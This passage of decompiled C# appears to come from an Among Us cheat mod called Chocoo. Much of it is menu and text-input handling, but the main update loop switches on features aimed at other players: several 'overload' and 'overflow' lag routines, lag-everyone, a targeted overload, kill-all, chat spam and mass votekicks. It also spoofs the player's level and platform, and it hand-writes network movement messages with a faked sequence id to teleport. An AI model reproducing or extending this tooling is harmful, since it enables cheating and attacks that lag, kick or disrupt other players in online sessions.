    private float lastTargetedMethod2Time = 0.0f;
    private float overload8TargetTimer = 450f;
    private int overload8TargetWavesLeft = 0;
    private int breakCounterDelay = 0;
    private int repairSabotagesDelay = 0;
    private int killAllDelay = 0;
    private int overloadMethod4Delay = 0;
    private int lagEveryoneDelay = 0;
    private float lastLagEveryoneFireTime = 0.0f;
    private float lastOverloadMethod8FireTime = 0.0f;
    private float lastOverloadMethod3FireTime = 0.0f;
    private string[] mapNames = new string[5]
    {
      "The Skeld",
      "MIRA HQ",
      "Polus",
      "Reverse Skeld",
      "Airship"
    };
    private PlayerControl[] _cachedPlayers = new PlayerControl[0];
    private float _playerCacheTimer = 0.0f;
    private static readonly Dictionary<Color, Texture2D> _texCache = new Dictionary<Color, Texture2D>();

    private float GetRgbUpdateInterval()
    {
      switch (this.rgbGradientMode)
      {
        case 0:
          return 5f;
        case 1:
          return 0.2f;
        case 2:
          return 0.2f;
        case 3:
          return 0.2f;
        default:
          return 5f;
      }
    }

    private void Start()
    {
      this.customPlatformInputText = ChocooPlugin.Config_CustomPlatformInputText.Value;
      if (ChocooPlugin.SpoofedLevel > 0)
        this.levelInputText = ChocooPlugin.SpoofedLevel.ToString();
      if (!ChocooPlugin.ShowMenuOnStartup)
        return;
      ChocooPlugin.ShowMenu = true;
      if (ChocooPlugin.DisableAnimations)
      {
        this.menuAnimationProgress = 1f;
        this.isAnimatingIn = false;
      }
      else
      {
        this.menuAnimationProgress = 0.0f;
        this.isAnimatingIn = true;
      }
    }

    private void Update()
    {
      if (this.isAnimatingIn)
      {
        this.menuAnimationProgress += Time.deltaTime * 8f;
        if ((double) this.menuAnimationProgress >= 1.0)
        {
          this.menuAnimationProgress = 1f;
          this.isAnimatingIn = false;
        }
      }
      else if (this.isAnimatingOut)
      {
        this.menuAnimationProgress -= Time.deltaTime * 8f;
        if ((double) this.menuAnimationProgress <= 0.0)
        {
          this.menuAnimationProgress = 0.0f;
          this.isAnimatingOut = false;
          ChocooPlugin.ShowMenu = false;
        }
      }
      if ((double) this._telekillSnapTimer > 0.0)
      {
        this._telekillSnapTimer -= Time.deltaTime;
        if ((double) this._telekillSnapTimer <= 0.0)
        {
          PlayerControl.LocalPlayer.NetTransform.RpcSnapTo(this._telekillOldPos);
          this._telekillSnapTimer = -1f;
        }
      }
      this._playerCacheTimer += Time.deltaTime;
      if ((double) this._playerCacheTimer >= 0.5)
      {
        this._playerCacheTimer = 0.0f;
        try
        {
          if (PlayerControl.AllPlayerControls != null)
            this._cachedPlayers = Il2CppArrayBase<PlayerControl>.op_Implicit(PlayerControl.AllPlayerControls.ToArray());
        }
        catch
        {
        }
        if (ChocooPlugin.ShowPlayerInfo || ChocooPlugin.SeeRolesEnabled || ChocooPlugin.BlacklistedCodes.Count > 0 || ChocooPlugin.ShowKillCooldown)
          ChocooPlugin.PlayerNametagsPatch.RefreshAll();
        else
          ChocooPlugin.PlayerNametagsPatch.RestoreAll();
        ChocooPlugin.TrackOwnModUsage();
      }
      if (ChocooPlugin.ShowVotekickCounter)
      {
        ChocooPlugin.ChocooMenu.UpdateVoteKickBadges();
      }
      else
      {
        foreach (KeyValuePair<PlayerControl, TextMeshPro> voteKickBadge in ChocooPlugin.voteKickBadges)
        {
          if (Object.op_Inequality((Object) voteKickBadge.Value, (Object) null) && Object.op_Inequality((Object) ((Component) voteKickBadge.Value).gameObject, (Object) null))
            ((Component) voteKickBadge.Value).gameObject.SetActive(false);
        }
      }
      HashSet<byte> byteSet = new HashSet<byte>();
      foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
      {
        if (Object.op_Inequality((Object) allPlayerControl, (Object) null))
          byteSet.Add(allPlayerControl.PlayerId);
      }
      if ((double) this.tabTransitionProgress < 1.0)
      {
        if (ChocooPlugin.DisableAnimations)
        {
          this.tabTransitionProgress = 1f;
        }
        else
        {
          this.tabTransitionProgress += Time.deltaTime * 8f;
          if ((double) this.tabTransitionProgress >= 1.0)
          {
            ChocooPlugin.ActiveTab = this.targetTab;
            this.tabTransitionProgress = 1f;
          }
        }
        this.contentOffset = Vector2.Lerp(new Vector2(50f, 0.0f), Vector2.zero, 1f - Mathf.Pow(1f - this.tabTransitionProgress, 3f));
      }
      else
        this.contentOffset = Vector2.zero;
      if (ChocooPlugin.isChangingKey)
      {
        foreach (KeyCode keyCode in Enum.GetValues(typeof (KeyCode)))
        {
          if (Input.GetKeyDown(keyCode))
          {
            ChocooPlugin.MenuKey.Value = keyCode;
            ChocooPlugin.isChangingKey = false;
            break;
          }
        }
      }
      else if (Input.GetKeyDown(ChocooPlugin.MenuKey.Value))
      {
        if (ChocooPlugin.ShowMenu)
        {
          if (ChocooPlugin.DisableAnimations)
          {
            ChocooPlugin.ShowMenu = false;
          }
          else
          {
            this.isAnimatingOut = true;
            this.isAnimatingIn = false;
          }
        }
        else
        {
          ChocooPlugin.ShowMenu = true;
          if (ChocooPlugin.DisableAnimations)
          {
            this.menuAnimationProgress = 1f;
            this.isAnimatingIn = false;
            this.isAnimatingOut = false;
          }
          else
          {
            this.isAnimatingIn = true;
            this.isAnimatingOut = false;
            this.menuAnimationProgress = 0.0f;
          }
          if (ChocooPlugin.MoveMenuToCursor)
          {
            Vector2 vector2 = Vector2.op_Implicit(Input.mousePosition);
            ((Rect) ref this.windowRect).position = new Vector2(vector2.x, (float) Screen.height - vector2.y);
          }
        }
      }
      if (ChocooPlugin.ShowMenu && ChocooPlugin.ActiveTab == "Chat" && this.chatBoxFocused)
      {
        this.cursorBlinkTime += Time.deltaTime;
        if ((double) this.cursorBlinkTime >= 0.5)
        {
          this.showCursor = !this.showCursor;
          this.cursorBlinkTime = 0.0f;
        }
        if (this.cursorPosition > this.chatMessage.Length)
          this.cursorPosition = this.chatMessage.Length;
        if (this.cursorPosition < 0)
          this.cursorPosition = 0;
        if (Input.GetKeyDown((KeyCode) 276) && this.cursorPosition > 0)
          --this.cursorPosition;
        if (Input.GetKeyDown((KeyCode) 275) && this.cursorPosition < this.chatMessage.Length)
          ++this.cursorPosition;
        if (Input.GetKeyDown((KeyCode) 278))
          this.cursorPosition = 0;
        if (Input.GetKeyDown((KeyCode) 279))
          this.cursorPosition = this.chatMessage.Length;
        if (Input.GetKey((KeyCode) 306) || Input.GetKey((KeyCode) 305))
        {
          if (Input.GetKeyDown((KeyCode) 99) && !string.IsNullOrEmpty(this.chatMessage))
          {
            GUIUtility.systemCopyBuffer = this.chatMessage;
            ChocooPlugin.Logger.LogInfo((object) ("Copied to clipboard: " + this.chatMessage));
          }
          if (Input.GetKeyDown((KeyCode) 118))
          {
            string systemCopyBuffer = GUIUtility.systemCopyBuffer;
            if (!string.IsNullOrEmpty(systemCopyBuffer) && this.chatMessage.Length + systemCopyBuffer.Length <= 100)
            {
              this.chatMessage = this.chatMessage.Insert(this.cursorPosition, systemCopyBuffer);
              this.cursorPosition += systemCopyBuffer.Length;
              ChocooPlugin.Logger.LogInfo((object) "Pasted from clipboard");
            }
          }
          if (Input.GetKeyDown((KeyCode) 97))
            this.cursorPosition = this.chatMessage.Length;
        }
        else
        {
          if (Input.GetKey((KeyCode) 8) && this.cursorPosition > 0)
          {
            this.backspaceHoldTime += Time.deltaTime;
            if (Input.GetKeyDown((KeyCode) 8))
            {
              this.chatMessage = this.chatMessage.Remove(this.cursorPosition - 1, 1);
              --this.cursorPosition;
              this.backspaceHoldTime = 0.0f;
              this.backspaceRepeatDelay = 0.5f;
            }
            else if ((double) this.backspaceHoldTime >= (double) this.backspaceRepeatDelay)
            {
              this.chatMessage = this.chatMessage.Remove(this.cursorPosition - 1, 1);
              --this.cursorPosition;
              this.backspaceHoldTime = 0.0f;
              this.backspaceRepeatDelay = 0.05f;
            }
          }
          else
          {
            this.backspaceHoldTime = 0.0f;
            this.backspaceRepeatDelay = 0.0f;
          }
          if (Input.GetKeyDown((KeyCode) (int) sbyte.MaxValue) && this.cursorPosition < this.chatMessage.Length)
            this.chatMessage = this.chatMessage.Remove(this.cursorPosition, 1);
          if ((Input.GetKey((KeyCode) 304) || Input.GetKey((KeyCode) 303)) && Input.GetKeyDown((KeyCode) 13))
          {
            if ((double) (Time.time - this.lastChatSendTime) >= 3.0 && !string.IsNullOrWhiteSpace(this.chatMessage))
              this.SendChatMessage(this.chatMessage.Trim());
          }
          else if (Input.GetKeyDown((KeyCode) 13) && this.chatMessage.Length < 100)
          {
            this.chatMessage = this.chatMessage.Insert(this.cursorPosition, "\n");
            ++this.cursorPosition;
          }
          if (this.chatMessage.Length < 100)
          {
            string inputString = Input.inputString;
            if (!string.IsNullOrEmpty(inputString))
            {
              foreach (char ch in inputString)
              {
                if (ch >= ' ' && ch <= '~' && this.chatMessage.Length < 100)
                {
                  this.chatMessage = this.chatMessage.Insert(this.cursorPosition, ch.ToString());
                  ++this.cursorPosition;
                }
              }
            }
          }
        }
      }
      if (ChocooPlugin.ShowMenu && ChocooPlugin.ActiveTab == "Players" && this.forceNameBoxFocused)
      {
        this.forceNameCursorBlinkTime += Time.deltaTime;
        if ((double) this.forceNameCursorBlinkTime >= 0.5)
        {
          this.forceNameShowCursor = !this.forceNameShowCursor;
          this.forceNameCursorBlinkTime = 0.0f;
        }
        if (this.forceNameCursorPos > this.forceNameInput.Length)
          this.forceNameCursorPos = this.forceNameInput.Length;
        if (this.forceNameCursorPos < 0)
          this.forceNameCursorPos = 0;
        if (Input.GetKeyDown((KeyCode) 276) && this.forceNameCursorPos > 0)
          --this.forceNameCursorPos;
        if (Input.GetKeyDown((KeyCode) 275) && this.forceNameCursorPos < this.forceNameInput.Length)
          ++this.forceNameCursorPos;
        if (Input.GetKeyDown((KeyCode) 278))
          this.forceNameCursorPos = 0;
        if (Input.GetKeyDown((KeyCode) 279))
          this.forceNameCursorPos = this.forceNameInput.Length;
        if (Input.GetKey((KeyCode) 306) || Input.GetKey((KeyCode) 305))
        {
          if (Input.GetKeyDown((KeyCode) 99) && !string.IsNullOrEmpty(this.forceNameInput))
          {
            GUIUtility.systemCopyBuffer = this.forceNameInput;
            ChocooPlugin.Logger.LogInfo((object) ("Copied to clipboard: " + this.forceNameInput));
          }
          if (Input.GetKeyDown((KeyCode) 118))
          {
            string systemCopyBuffer = GUIUtility.systemCopyBuffer;
            if (!string.IsNullOrEmpty(systemCopyBuffer) && this.forceNameInput.Length + systemCopyBuffer.Length <= 250)
            {
              this.forceNameInput = this.forceNameInput.Insert(this.forceNameCursorPos, systemCopyBuffer);
              this.forceNameCursorPos += systemCopyBuffer.Length;
              ChocooPlugin.Logger.LogInfo((object) "Pasted from clipboard");
            }
          }
          if (Input.GetKeyDown((KeyCode) 97))
            this.forceNameCursorPos = this.forceNameInput.Length;
        }
        else
        {
          if (Input.GetKey((KeyCode) 8) && this.forceNameCursorPos > 0)
          {
            this.forceNameBackspaceHoldTime += Time.deltaTime;
            if (Input.GetKeyDown((KeyCode) 8))
            {
              this.forceNameInput = this.forceNameInput.Remove(this.forceNameCursorPos - 1, 1);
              --this.forceNameCursorPos;
              this.forceNameBackspaceHoldTime = 0.0f;
              this.forceNameBackspaceRepeatDelay = 0.5f;
            }
            else if ((double) this.forceNameBackspaceHoldTime >= (double) this.forceNameBackspaceRepeatDelay)
            {
              this.forceNameInput = this.forceNameInput.Remove(this.forceNameCursorPos - 1, 1);
              --this.forceNameCursorPos;
              this.forceNameBackspaceHoldTime = 0.0f;
              this.forceNameBackspaceRepeatDelay = 0.05f;
            }
          }
          else
          {
            this.forceNameBackspaceHoldTime = 0.0f;
            this.forceNameBackspaceRepeatDelay = 0.0f;
          }
          if (Input.GetKeyDown((KeyCode) (int) sbyte.MaxValue) && this.forceNameCursorPos < this.forceNameInput.Length)
            this.forceNameInput = this.forceNameInput.Remove(this.forceNameCursorPos, 1);
          if (Input.GetKeyDown((KeyCode) 27) || Input.GetKeyDown((KeyCode) 13) || Input.GetKeyDown((KeyCode) 271))
            this.forceNameBoxFocused = false;
          if (this.forceNameInput.Length < 250)
          {
            string inputString = Input.inputString;
            if (!string.IsNullOrEmpty(inputString))
            {
              foreach (char ch in inputString)
              {
                if (ch >= ' ' && ch <= '~' && this.forceNameInput.Length < 250)
                {
                  this.forceNameInput = this.forceNameInput.Insert(this.forceNameCursorPos, ch.ToString());
                  ++this.forceNameCursorPos;
                }
              }
            }
          }
        }
      }
      if (ChocooPlugin.ChocooMenu.SpamChatEnabled)
        this.ExecuteSpamChat();
      if (ChocooPlugin.VotekickAllEnabled)
        this.MonitorAndVotekickNewPlayers();
      if (!ChocooPlugin.ExtendedLobbyEnabled)
        ChocooPlugin.ExtendedLobbyListPatch.Reset();
      if (ChocooPlugin.OverloadMethod8Enabled)
        this.ExecuteOverloadMethod8();
      if (ChocooPlugin.OverloadMethod3Enabled)
        this.ExecuteOverloadMethod3Mix();
      if (ChocooPlugin.OverflowMethod3Enabled)
        this.ExecuteOverflowMethod3();
      if (ChocooPlugin.OverflowMethod4Enabled)
        this.ExecuteOverflowMethod4();
      if (ChocooPlugin.OverflowMethod5Enabled)
        this.ExecuteOverflowMethod5();
      if (ChocooPlugin.OverflowMethod6Enabled)
        this.ExecuteOverflowMethod6();
      if (ChocooPlugin.OverflowMethod7Enabled)
        this.ExecuteOverflowMethod7();
      if (ChocooPlugin.OverflowMethod8Enabled)
        this.ExecuteOverflowMethod8();
      if (ChocooPlugin.LagEveryoneEnabled)
        this.ExecuteLagEveryone();
      if (ChocooPlugin.selectedTargetId != -1)
        this.ExecuteTargetedOverload();
      if (ChocooPlugin.SpamRepairSabotages)
        this.ExecuteRepairSabotages();
      if (ChocooPlugin.KillAllEnabled)
        this.ExecuteKillAll();
      Time.timeScale = ChocooPlugin.GameSpeed;
      if (ChocooPlugin.ShowMenu && ChocooPlugin.ActiveTab == "Anticheat" && this.blacklistInputFocused)
      {
        this.blacklistCursorBlink += Time.deltaTime;
        if ((double) this.blacklistCursorBlink >= 0.5)
        {
          this.blacklistCursorVisible = !this.blacklistCursorVisible;
          this.blacklistCursorBlink = 0.0f;
        }
        this.blacklistCursorPos = Mathf.Clamp(this.blacklistCursorPos, 0, this.blacklistInput.Length);
        if (Input.GetKeyDown((KeyCode) 276) && this.blacklistCursorPos > 0)
          --this.blacklistCursorPos;
        if (Input.GetKeyDown((KeyCode) 275) && this.blacklistCursorPos < this.blacklistInput.Length)
          ++this.blacklistCursorPos;
        if (Input.GetKeyDown((KeyCode) 8) && this.blacklistCursorPos > 0)
        {
          this.blacklistInput = this.blacklistInput.Remove(this.blacklistCursorPos - 1, 1);
          --this.blacklistCursorPos;
        }
        if (Input.GetKeyDown((KeyCode) 13) && !string.IsNullOrWhiteSpace(this.blacklistInput))
        {
          ChocooPlugin.SaveToBlacklist(this.blacklistInput.Trim());
          this.blacklistAddedMessage = "Added: " + this.blacklistInput.Trim();
          this.blacklistMessageTimer = 3f;
          this.blacklistInput = "";
          this.blacklistCursorPos = 0;
          this.blacklistInputFocused = false;
        }
        if (Input.GetKeyDown((KeyCode) 27))
          this.blacklistInputFocused = false;
        if (this.blacklistInput.Length < 20)
        {
          foreach (char ch in Input.inputString)
          {
            if (ch >= ' ' && ch <= '~' && this.blacklistInput.Length < 20)
            {
              this.blacklistInput = this.blacklistInput.Insert(this.blacklistCursorPos, ch.ToString());
              ++this.blacklistCursorPos;
            }
          }
        }
      }
      if (ChocooPlugin.VotekickAllEnabled != this._lastVotekickAllState)
      {
        if (ChocooPlugin.VotekickAllEnabled)
          DestroyableSingleton<HudManager>.Instance?.Notifier?.AddDisconnectMessage("Votekick Sent");
        this._lastVotekickAllState = ChocooPlugin.VotekickAllEnabled;
      }
      if (ChocooPlugin.ShowMenu && ChocooPlugin.ActiveTab == "Host" && this.activeHostSection == "Settings" && !string.IsNullOrEmpty(this.focusedSettingKey) && this.settingsBoxFocused)
      {
        this.settingCursorBlink += Time.deltaTime;
        if ((double) this.settingCursorBlink >= 0.5)
        {
          this.settingCursorVisible = !this.settingCursorVisible;
          this.settingCursorBlink = 0.0f;
        }
        if (Input.GetKeyDown((KeyCode) 27))
        {
          this.ApplySettingInput(this.focusedSettingKey, this.settingInputBuffer);
          this.focusedSettingKey = "";
          this.settingInputBuffer = "";
        }
        if (Input.GetKeyDown((KeyCode) 13) || Input.GetKeyDown((KeyCode) 271))
        {
          this.ApplySettingInput(this.focusedSettingKey, this.settingInputBuffer);
          this.focusedSettingKey = "";
          this.settingInputBuffer = "";
        }
        if (Input.GetKeyDown((KeyCode) 8) && this.settingInputBuffer.Length > 0)
          this.settingInputBuffer = this.settingInputBuffer.Substring(0, this.settingInputBuffer.Length - 1);
        foreach (char ch in Input.inputString)
        {
          if ((ch >= '0' && ch <= '9' || ch == '.' || ch == '-') && this.settingInputBuffer.Length < 10)
            this.settingInputBuffer += ch.ToString();
        }
      }
      if (ChocooPlugin.TeleportToCursorEnabled && Input.GetMouseButtonDown(1))
        PlayerControl.LocalPlayer?.NetTransform.RpcSnapTo(Vector2.op_Implicit(Camera.main.ScreenToWorldPoint(Input.mousePosition)));
      if (ChocooPlugin.MoveSelfByCursorEnabled && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null) && PlayerControl.LocalPlayer.CanMove)
      {
        if (Input.GetMouseButtonDown(1))
          PlayerControl.LocalPlayer.ToggleHighlight(true, (RoleTeamTypes) 0);
        if (Input.GetMouseButton(1))
        {
          Vector2 vector2 = Vector2.op_Implicit(Camera.main.ScreenToWorldPoint(Input.mousePosition));
          ((Component) PlayerControl.LocalPlayer).transform.position = Vector2.op_Implicit(vector2);
          PlayerControl.LocalPlayer.NetTransform.body.position = vector2;
          PlayerControl.LocalPlayer.NetTransform.body.velocity = Vector2.zero;
          ChocooPlugin._moveSelfTimer += Time.deltaTime;
          if ((double) ChocooPlugin._moveSelfTimer >= (double) Time.fixedDeltaTime)
          {
            ChocooPlugin._moveSelfTimer = 0.0f;
            ushort num = (ushort) ((uint) PlayerControl.LocalPlayer.NetTransform.lastSequenceId + 8U);
            PlayerControl.LocalPlayer.NetTransform.SnapTo(vector2, num);
            MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) PlayerControl.LocalPlayer.NetTransform).NetId, (byte) 21, (SendOption) 1, -1);
            NetHelpers.WriteVector2(vector2, messageWriter);
            messageWriter.Write(num);
            ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
          }
        }
        if (Input.GetMouseButtonUp(1))
        {
          ChocooPlugin._moveSelfTimer = 0.0f;
          PlayerControl.LocalPlayer.ToggleHighlight(false, (RoleTeamTypes) 0);
        }
      }
      if (ChocooPlugin.AnimAsteroidsEnabled)
      {
        try
        {
          if (Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
            this.ForcePlayAnimation((byte) 6);
        }
        catch (Exception ex)
        {
          ChocooPlugin.Logger.LogError((object) ("Asteroids anim error: " + ex.Message));
        }
      }
      if (ChocooPlugin.ShowMenu && this.searchBoxFocused)
      {
        this.searchCursorBlinkTime += Time.deltaTime;
        if ((double) this.searchCursorBlinkTime >= 0.5)
        {
          this.searchCursorVisible = !this.searchCursorVisible;
          this.searchCursorBlinkTime = 0.0f;
        }
        if (this.searchCursorPosition > this.searchQuery.Length)
          this.searchCursorPosition = this.searchQuery.Length;
        if (this.searchCursorPosition < 0)
          this.searchCursorPosition = 0;
        if (Input.GetKeyDown((KeyCode) 276) && this.searchCursorPosition > 0)
          --this.searchCursorPosition;
        if (Input.GetKeyDown((KeyCode) 275) && this.searchCursorPosition < this.searchQuery.Length)
          ++this.searchCursorPosition;
        if (Input.GetKeyDown((KeyCode) 278))
          this.searchCursorPosition = 0;
        if (Input.GetKeyDown((KeyCode) 279))
          this.searchCursorPosition = this.searchQuery.Length;
        if (Input.GetKeyDown((KeyCode) 8) && this.searchCursorPosition > 0)
        {
          this.searchQuery = this.searchQuery.Remove(this.searchCursorPosition - 1, 1);
          --this.searchCursorPosition;
        }
        if (Input.GetKeyDown((KeyCode) (int) sbyte.MaxValue) && this.searchCursorPosition < this.searchQuery.Length)
          this.searchQuery = this.searchQuery.Remove(this.searchCursorPosition, 1);
        if (Input.GetKeyDown((KeyCode) 27))
        {
          this.searchBoxFocused = false;
          this.searchQuery = "";
          this.searchResults.Clear();
        }
        if (this.searchQuery.Length < 50)
        {
          string inputString = Input.inputString;
          if (!string.IsNullOrEmpty(inputString))
          {
            foreach (char ch in inputString)
            {
              if (ch >= ' ' && ch <= '~' && this.searchQuery.Length < 50)
              {
                this.searchQuery = this.searchQuery.Insert(this.searchCursorPosition, ch.ToString());
                ++this.searchCursorPosition;
              }
            }
          }
        }
        if (ChocooPlugin.ChocooMenu.autoTesting)
          this.AutoTestQuickChatIds();
      }
      if (ChocooPlugin.ShowMenu && ChocooPlugin.ActiveTab == "Settings" && this.fpsInputFocused)
      {
        ChocooPlugin.ChocooMenu.fpsLastCursorBlink += Time.deltaTime;
        if ((double) ChocooPlugin.ChocooMenu.fpsLastCursorBlink >= 0.5)
        {
          ChocooPlugin.ChocooMenu.fpsCursorVisible = !ChocooPlugin.ChocooMenu.fpsCursorVisible;
          ChocooPlugin.ChocooMenu.fpsLastCursorBlink = 0.0f;
        }
        ChocooPlugin.ChocooMenu.fpsCursorPos = Mathf.Clamp(ChocooPlugin.ChocooMenu.fpsCursorPos, 0, this.fpsInputText.Length);
        if (Input.GetKeyDown((KeyCode) 8) && ChocooPlugin.ChocooMenu.fpsCursorPos > 0)
        {
          this.fpsInputText = this.fpsInputText.Remove(ChocooPlugin.ChocooMenu.fpsCursorPos - 1, 1);
          --ChocooPlugin.ChocooMenu.fpsCursorPos;
        }
        if (Input.GetKeyDown((KeyCode) (int) sbyte.MaxValue) && ChocooPlugin.ChocooMenu.fpsCursorPos < this.fpsInputText.Length)
          this.fpsInputText = this.fpsInputText.Remove(ChocooPlugin.ChocooMenu.fpsCursorPos, 1);
        if (Input.GetKeyDown((KeyCode) 276) && ChocooPlugin.ChocooMenu.fpsCursorPos > 0)
          --ChocooPlugin.ChocooMenu.fpsCursorPos;
        if (Input.GetKeyDown((KeyCode) 275) && ChocooPlugin.ChocooMenu.fpsCursorPos < this.fpsInputText.Length)
          ++ChocooPlugin.ChocooMenu.fpsCursorPos;
        if (Input.GetKeyDown((KeyCode) 278))
          ChocooPlugin.ChocooMenu.fpsCursorPos = 0;
        if (Input.GetKeyDown((KeyCode) 279))
          ChocooPlugin.ChocooMenu.fpsCursorPos = this.fpsInputText.Length;
        if (this.fpsInputText.Length < 3)
        {
          string inputString = Input.inputString;
          if (!string.IsNullOrEmpty(inputString))
          {
            foreach (char ch in inputString)
            {
              int num;
              switch (ch)
              {
                case '0':
                case '1':
                case '2':
                case '3':
                case '4':
                case '5':
                case '6':
                case '7':
                case '8':
                case '9':
                  num = this.fpsInputText.Length < 3 ? 1 : 0;
                  break;
                default:
                  num = 0;
                  break;
              }
              if (num != 0)
              {
                this.fpsInputText = this.fpsInputText.Insert(ChocooPlugin.ChocooMenu.fpsCursorPos, ch.ToString());
                ++ChocooPlugin.ChocooMenu.fpsCursorPos;
              }
            }
          }
        }
        int result;
        if ((Input.GetKeyDown((KeyCode) 13) || Input.GetKeyDown((KeyCode) 271)) && int.TryParse(this.fpsInputText, out result))
        {
          result = Mathf.Clamp(result, 10, 999);
          ChocooPlugin.GameSpeed = 1f;
          Application.targetFrameRate = result;
          this.fpsInputText = result.ToString();
          this.fpsInputFocused = false;
        }
        if (Input.GetKeyDown((KeyCode) 27))
          this.fpsInputFocused = false;
      }
      if (ChocooPlugin.ShowMenu && ChocooPlugin.ActiveTab == "Settings" && this.levelInputFocused)
      {
        ChocooPlugin.ChocooMenu.levelLastCursorBlink += Time.deltaTime;
        if ((double) ChocooPlugin.ChocooMenu.levelLastCursorBlink >= 0.5)
        {
          ChocooPlugin.ChocooMenu.levelCursorVisible = !ChocooPlugin.ChocooMenu.levelCursorVisible;
          ChocooPlugin.ChocooMenu.levelLastCursorBlink = 0.0f;
        }
        ChocooPlugin.ChocooMenu.levelCursorPos = Mathf.Clamp(ChocooPlugin.ChocooMenu.levelCursorPos, 0, this.levelInputText.Length);
        if (Input.GetKeyDown((KeyCode) 8) && ChocooPlugin.ChocooMenu.levelCursorPos > 0)
        {
          this.levelInputText = this.levelInputText.Remove(ChocooPlugin.ChocooMenu.levelCursorPos - 1, 1);
          --ChocooPlugin.ChocooMenu.levelCursorPos;
        }
        if (Input.GetKeyDown((KeyCode) (int) sbyte.MaxValue) && ChocooPlugin.ChocooMenu.levelCursorPos < this.levelInputText.Length)
          this.levelInputText = this.levelInputText.Remove(ChocooPlugin.ChocooMenu.levelCursorPos, 1);
        if (Input.GetKeyDown((KeyCode) 276) && ChocooPlugin.ChocooMenu.levelCursorPos > 0)
          --ChocooPlugin.ChocooMenu.levelCursorPos;
        if (Input.GetKeyDown((KeyCode) 275) && ChocooPlugin.ChocooMenu.levelCursorPos < this.levelInputText.Length)
          ++ChocooPlugin.ChocooMenu.levelCursorPos;
        if (Input.GetKeyDown((KeyCode) 278))
          ChocooPlugin.ChocooMenu.levelCursorPos = 0;
        if (Input.GetKeyDown((KeyCode) 279))
          ChocooPlugin.ChocooMenu.levelCursorPos = this.levelInputText.Length;
        if (this.levelInputText.Length < 6)
        {
          string inputString = Input.inputString;
          if (!string.IsNullOrEmpty(inputString))
          {
            foreach (char ch in inputString)
            {
              int num;
              switch (ch)
              {
                case '0':
                case '1':
                case '2':
                case '3':
                case '4':
                case '5':
                case '6':
                case '7':
                case '8':
                case '9':
                  num = this.levelInputText.Length < 6 ? 1 : 0;
                  break;
                default:
                  num = 0;
                  break;
              }
              if (num != 0)
              {
                this.levelInputText = this.levelInputText.Insert(ChocooPlugin.ChocooMenu.levelCursorPos, ch.ToString());
                ++ChocooPlugin.ChocooMenu.levelCursorPos;
              }
            }
          }
        }
        int result;
        if ((Input.GetKeyDown((KeyCode) 13) || Input.GetKeyDown((KeyCode) 271)) && int.TryParse(this.levelInputText, out result))
        {
          result = Mathf.Clamp(result, 1, 100001);
          ChocooPlugin.SpoofedLevel = result;
          ChocooPlugin.Config_SpoofedLevel.Value = result;
          this.levelInputText = result.ToString();
          this.levelInputFocused = false;
        }
        if (Input.GetKeyDown((KeyCode) 27))
          this.levelInputFocused = false;
      }
      if (ChocooPlugin.ShowMenu && ChocooPlugin.ActiveTab == "Settings" && this.customPlatformInputFocused)
      {
        ChocooPlugin.ChocooMenu.customPlatformLastCursorBlink += Time.deltaTime;
        if ((double) ChocooPlugin.ChocooMenu.customPlatformLastCursorBlink >= 0.5)
        {
          ChocooPlugin.ChocooMenu.customPlatformCursorVisible = !ChocooPlugin.ChocooMenu.customPlatformCursorVisible;
          ChocooPlugin.ChocooMenu.customPlatformLastCursorBlink = 0.0f;
        }
        ChocooPlugin.ChocooMenu.customPlatformCursorPos = Mathf.Clamp(ChocooPlugin.ChocooMenu.customPlatformCursorPos, 0, this.customPlatformInputText.Length);
        if (Input.GetKeyDown((KeyCode) 8) && ChocooPlugin.ChocooMenu.customPlatformCursorPos > 0)
        {
          this.customPlatformInputText = this.customPlatformInputText.Remove(ChocooPlugin.ChocooMenu.customPlatformCursorPos - 1, 1);
          --ChocooPlugin.ChocooMenu.customPlatformCursorPos;
        }
        if (Input.GetKeyDown((KeyCode) (int) sbyte.MaxValue) && ChocooPlugin.ChocooMenu.customPlatformCursorPos < this.customPlatformInputText.Length)
          this.customPlatformInputText = this.customPlatformInputText.Remove(ChocooPlugin.ChocooMenu.customPlatformCursorPos, 1);
        if (Input.GetKeyDown((KeyCode) 276) && ChocooPlugin.ChocooMenu.customPlatformCursorPos > 0)
          --ChocooPlugin.ChocooMenu.customPlatformCursorPos;
        if (Input.GetKeyDown((KeyCode) 275) && ChocooPlugin.ChocooMenu.customPlatformCursorPos < this.customPlatformInputText.Length)
          ++ChocooPlugin.ChocooMenu.customPlatformCursorPos;
        if (Input.GetKeyDown((KeyCode) 278))
          ChocooPlugin.ChocooMenu.customPlatformCursorPos = 0;
        if (Input.GetKeyDown((KeyCode) 279))
          ChocooPlugin.ChocooMenu.customPlatformCursorPos = this.customPlatformInputText.Length;
        if (this.customPlatformInputText.Length < 32 /*0x20*/)
        {
          string inputString = Input.inputString;
          if (!string.IsNullOrEmpty(inputString))
          {
            foreach (char ch in inputString)
            {
              if (ch >= ' ' && ch != '|' && this.customPlatformInputText.Length < 32 /*0x20*/)
              {
                this.customPlatformInputText = this.customPlatformInputText.Insert(ChocooPlugin.ChocooMenu.customPlatformCursorPos, ch.ToString());
                ++ChocooPlugin.ChocooMenu.customPlatformCursorPos;
              }
            }
          }
        }
        if (Input.GetKeyDown((KeyCode) 13) || Input.GetKeyDown((KeyCode) 271))
        {
          if (!string.IsNullOrEmpty(this.customPlatformInputText))
          {
            ChocooPlugin.SpoofedPlatform = this.customPlatformInputText;
            ChocooPlugin.RefreshAllPlayerNametags();
          }
          this.customPlatformInputFocused = false;
        }
        if (Input.GetKeyDown((KeyCode) 27))
          this.customPlatformInputFocused = false;
      }
      if (this.isAttachedToPlayer && this.attachedPlayerId != -1)
      {
        this.attachUpdateTimer -= Time.deltaTime;
        if ((double) this.attachUpdateTimer <= 0.0)
        {
          PlayerControl playerControl1 = (PlayerControl) null;
          foreach (PlayerControl playerControl2 in PlayerControl.AllPlayerControls.ToArray())
          {
            if (Object.op_Inequality((Object) playerControl2, (Object) null) && Object.op_Inequality((Object) playerControl2.Data, (Object) null) && playerControl2.Data.ClientId == this.attachedPlayerId)
            {
              playerControl1 = playerControl2;
              break;
            }
          }
          if (Object.op_Inequality((Object) playerControl1, (Object) null) && Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
          {
            Vector2 truePosition = playerControl1.GetTruePosition();
            truePosition.y += 0.3636f;
